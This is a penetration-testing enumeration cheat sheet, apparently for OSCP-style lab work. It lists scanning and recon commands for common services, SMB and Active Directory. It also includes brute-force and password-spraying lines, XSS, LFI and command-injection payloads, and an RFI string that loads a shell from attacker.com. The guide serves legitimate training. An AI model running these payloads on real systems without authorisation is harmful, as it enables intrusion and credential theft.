# Enumeration Guide

**Author:** r0tn3x  
**Last Updated:** December 15, 2025

---

## 📋 Table of Contents

1. [Network Enumeration](#network-enumeration)
2. [Port Scanning](#port-scanning)
3. [Service Enumeration](#service-enumeration)
4. [Web Enumeration](#web-enumeration)
5. [SMB Enumeration](#smb-enumeration)
6. [LDAP/AD Enumeration](#ldapad-enumeration)
7. [Automated Tools](#automated-tools)

---

## 🌐 Network Enumeration

### Host Discovery

```bash
# Ping sweep
nmap -sn 10.10.10.0/24

# ARP scan (local network)
sudo arp-scan -l

# Netdiscover
sudo netdiscover -r 10.10.10.0/24
```

### Check your IP
```bash
ip a
ifconfig
hostname -I
```

---

## 🔍 Port Scanning

### Nmap - Essential Scans

**Quick TCP scan:**
```bash
nmap -p- -T4 --min-rate=1000 10.10.10.10
```

**Full TCP scan with service detection:**
```bash
nmap -p- -sC -sV -A -T4 10.10.10.10 -oN nmap-full.txt
```

**UDP top 100 ports:**
```bash
sudo nmap -sU --top-ports=100 10.10.10.10 -oN nmap-udp.txt
```

**Aggressive scan on specific ports:**
```bash
nmap -p 80,443,445,3389 -A -sC -sV 10.10.10.10
```

**Vulnerability scan:**
```bash
nmap -p- --script=vuln 10.10.10.10
```

### RustScan (Fast Alternative)
```bash
rustscan -a 10.10.10.10 -- -sC -sV -A
```

---

## 🛠️ Service Enumeration

### FTP (21)
```bash
# Anonymous login
ftp 10.10.10.10
# Username: anonymous
# Password: anonymous

# Nmap scripts
nmap -p 21 --script=ftp-* 10.10.10.10
```

### SSH (22)
```bash
# Banner grabbing
nc 10.10.10.10 22

# SSH enumeration
nmap -p 22 --script=ssh-* 10.10.10.10

# Bruteforce (use carefully)
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
```

### SMTP (25, 465, 587)
```bash
# Banner grabbing
nc 10.10.10.10 25

# User enumeration
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 10.10.10.10

# Manual enumeration
telnet 10.10.10.10 25
VRFY root
VRFY admin
```

### DNS (53)
```bash
# Zone transfer
dig axfr @10.10.10.10 domain.com

# DNS enumeration
dnsrecon -d domain.com -t axfr
dnsenum domain.com

# Subdomain brute force
gobuster dns -d domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### HTTP/HTTPS (80, 443, 8080)
See [Web Enumeration](#web-enumeration) section

### POP3 (110)
```bash
# Connect
telnet 10.10.10.10 110
USER username
PASS password
LIST
RETR 1
```

### RPC (111, 135)
```bash
# RPC info
rpcinfo -p 10.10.10.10

# Nmap scripts
nmap -p 135 --script=msrpc-enum 10.10.10.10
```

### SMB (139, 445)
See [SMB Enumeration](#smb-enumeration) section

### SNMP (161)
```bash
# SNMPwalk
snmpwalk -c public -v1 10.10.10.10

# SNMP enumeration
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.10

# Nmap scripts
nmap -p 161 --script=snmp-* 10.10.10.10
```

### LDAP (389, 636, 3268)
See [LDAP/AD Enumeration](#ldapad-enumeration) section

### MySQL (3306)
```bash
# Connect
mysql -h 10.10.10.10 -u root -p

# Nmap scripts
nmap -p 3306 --script=mysql-* 10.10.10.10
```

### RDP (3389)
```bash
# Check if RDP is open
nmap -p 3389 10.10.10.10

# RDP screenshot
nmap -p 3389 --script=rdp-enum-encryption 10.10.10.10

# Connect
xfreerdp /u:username /p:password /v:10.10.10.10
rdesktop 10.10.10.10
```

### PostgreSQL (5432)
```bash
# Connect
psql -h 10.10.10.10 -U postgres

# Nmap scripts
nmap -p 5432 --script=pgsql-brute 10.10.10.10
```

### VNC (5900)
```bash
# Connect
vncviewer 10.10.10.10

# Nmap scripts
nmap -p 5900 --script=vnc-* 10.10.10.10
```

### WinRM (5985, 5986)
```bash
# Evil-WinRM
evil-winrm -i 10.10.10.10 -u username -p password

# Check if enabled
nmap -p 5985,5986 10.10.10.10
```

---

## 🌐 Web Enumeration

### Directory/File Brute Force

**gobuster:**
```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,zip

gobuster dir -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
```

**feroxbuster (recursive):**
```bash
feroxbuster -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50

feroxbuster -u http://10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --depth 3
```

**ffuf:**
```bash
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403

# VHost fuzzing
ffuf -u http://10.10.10.10 -H "Host: FUZZ.domain.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1234
```

**dirsearch:**
```bash
dirsearch -u http://10.10.10.10 -e php,html,txt,zip -x 403,404
```

### Web Technologies

```bash
# Whatweb
whatweb http://10.10.10.10

# Wappalyzer (browser extension)

# Nikto
nikto -h http://10.10.10.10
```

### Manual Checks

1. **View source code** - Look for comments, hidden fields, credentials
2. **robots.txt** - `http://10.10.10.10/robots.txt`
3. **sitemap.xml** - `http://10.10.10.10/sitemap.xml`
4. **/.git/** - Git repository exposed
5. **/admin**, **/login**, **/dashboard**
6. **Check SSL certificate** - May reveal subdomains

### Web Vulnerabilities

```bash
# SQL Injection test
sqlmap -u "http://10.10.10.10/page.php?id=1" --batch --dbs

# XSS test
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# LFI test
http://10.10.10.10/page.php?file=../../../../etc/passwd
http://10.10.10.10/page.php?file=....//....//....//etc/passwd
http://10.10.10.10/page.php?file=php://filter/convert.base64-encode/resource=index.php

# RFI test
http://10.10.10.10/page.php?file=http://attacker.com/shell.php

# Command injection
; whoami
| whoami
& whoami
|| whoami
```

---

## 📁 SMB Enumeration

### SMB Tools

**smbclient:**
```bash
# List shares
smbclient -L //10.10.10.10 -N

# Connect to share
smbclient //10.10.10.10/share -U username

# Download all files
smbclient //10.10.10.10/share -U username -c "prompt OFF;recurse ON;mget *"
```

**smbmap:**
```bash
# List shares
smbmap -H 10.10.10.10

# With credentials
smbmap -H 10.10.10.10 -u username -p password

# Execute command
smbmap -H 10.10.10.10 -u username -p password -x 'ipconfig'
```

**enum4linux:**
```bash
enum4linux -a 10.10.10.10
```

**NetExec (CrackMapExec replacement):**
```bash
# SMB enumeration
netexec smb 10.10.10.10

# With credentials
netexec smb 10.10.10.10 -u username -p password

# List shares
netexec smb 10.10.10.10 -u username -p password --shares

# Spider shares
netexec smb 10.10.10.10 -u username -p password --spider SHARE
```

**Nmap scripts:**
```bash
nmap -p 445 --script=smb-enum-* 10.10.10.10
nmap -p 445 --script=smb-vuln-* 10.10.10.10
```

### Null Session
```bash
smbclient -L //10.10.10.10 -N
enum4linux -n 10.10.10.10
```

---

## 🏢 LDAP/AD Enumeration

### LDAP Search

```bash
# Anonymous LDAP bind
ldapsearch -x -H ldap://10.10.10.10 -s base

# Get domain info
ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts

# Dump all
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=com"

# With credentials
ldapsearch -x -H ldap://10.10.10.10 -D "CN=user,CN=Users,DC=domain,DC=com" -w password -b "DC=domain,DC=com"
```

### Active Directory

**NetExec:**
```bash
# Domain enumeration
netexec smb 10.10.10.10 -u '' -p '' --users
netexec smb 10.10.10.10 -u '' -p '' --groups
netexec smb 10.10.10.10 -u '' -p '' --pass-pol

# Password spraying
netexec smb 10.10.10.10 -u users.txt -p 'Password123'
```

**BloodHound:**
```bash
# Python ingestor (remote)
bloodhound-python -u username -p password -ns 10.10.10.10 -d domain.com -c all

# SharpHound (on Windows)
.\SharpHound.exe -c all
```

### Kerberos (88)
```bash
# User enumeration
kerbrute userenum --dc 10.10.10.10 -d domain.com /usr/share/seclists/Usernames/Names/names.txt

# AS-REP Roasting
impacket-GetNPUsers domain.com/ -dc-ip 10.10.10.10 -request
```

---

## 🤖 Automated Tools

### AutoRecon
```bash
autorecon 10.10.10.10
```

### nmapAutomator
```bash
./nmapAutomator.sh 10.10.10.10 All
```

---

## 📝 Enumeration Checklist

- [ ] Network scan completed
- [ ] All ports identified
- [ ] Service versions enumerated
- [ ] Web directories/files brute forced
- [ ] SMB shares enumerated
- [ ] User accounts identified
- [ ] Potential vulnerabilities noted
- [ ] All findings documented

---

**Next Steps:** See [Cheat Sheet](cheatsheet.md) for exploitation techniques

**Author:** r0tn3x | OSCP+ December 2025
